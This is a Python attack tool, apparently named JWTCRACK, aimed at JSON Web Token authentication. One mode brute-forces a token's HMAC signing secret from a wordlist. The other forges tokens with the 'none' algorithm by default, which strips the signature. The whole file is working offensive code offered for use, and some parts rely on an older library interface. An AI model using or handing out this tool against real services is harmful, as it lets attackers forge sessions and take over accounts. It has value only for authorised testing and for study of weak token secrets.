import jwt
import json
from optparse import OptionParser 


def runblasting(path,jwt_str,alg):
    if alg == "none":
        alg = "HS256"
    with open(path,encoding='utf-8') as f:
        for line in f:
            key_ = line.strip()
            try:
                jwt.decode(jwt_str,verify=True,key=key_,algorithm=alg)
                print('found key! --> ' +  key_)
                break
            except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
                print('found key! --> ' +  key_)
                break
            except(jwt.exceptions.InvalidSignatureError):
                continue
        else:
            print("key not found!")

def generatejwt(dictstring,key='',alg='none'):
    jsstr = json.loads(dictstring)
    return jwt.encode(jsstr, key=key, algorithm=alg).decode('utf-8')

if __name__ == "__main__":
    parser = OptionParser() 
    parser.add_option("-m", "--mode", action="store", dest="mode", default='',type="string",help="Mode has generate disable encryption and blasting encryption key [generate/blasting]")
    parser.add_option("-s", "--string", action="store", dest="jwtstring", default='',type="string",help="Input your JWT string")
    parser.add_option("-a", "--algorithm", action="store", dest="algorithm", default='none',type="string",help="Input JWT algorithm default:NONE")
    parser.add_option("-p", "--key", action="store", dest="key", default='',type="string",help="Input your Verify key") 
    parser.add_option("--kf", "--key-file", action="store", dest="keyfile", type="string", default=False, help="Input your Verify Key File")
    args = ["-m","generate","-s",{""}]
    (options, args) = parser.parse_args()
    if options.mode == "generate":
        print(generatejwt(options.jwtstring,options.key,options.algorithm))
        exit()
    if options.mode == "blasting":
        runblasting(options.keyfile,options.jwtstring,options.algorithm)
        exit()
    else:
        print(
        '''
      _____  ____      ____  _________    ______  _______          _        ______  ___  ____   
     |_   _||_  _|    |_  _||  _   _  | .' ___  ||_   __ \        / \     .' ___  ||_  ||_  _|  
       | |    \ \  /\  / /  |_/ | | \_|/ .'   \_|  | |__) |      / _ \   / .'   \_|  | |_/ /    
   _   | |     \ \/  \/ /       | |    | |         |  __ /      / ___ \  | |         |  __'.    
  | |__' |      \  /\  /       _| |_   \ `.___.'\ _| |  \ \_  _/ /   \ \_\ `.___.'\ _| |  \ \_  
  `.____.'       \/  \/       |_____|   `.____ .'|____| |___||____| |____|`.____ .'|____||____| 
                                                                                    By:Ch1ng
        '''
        )
        print(parser.format_help())
   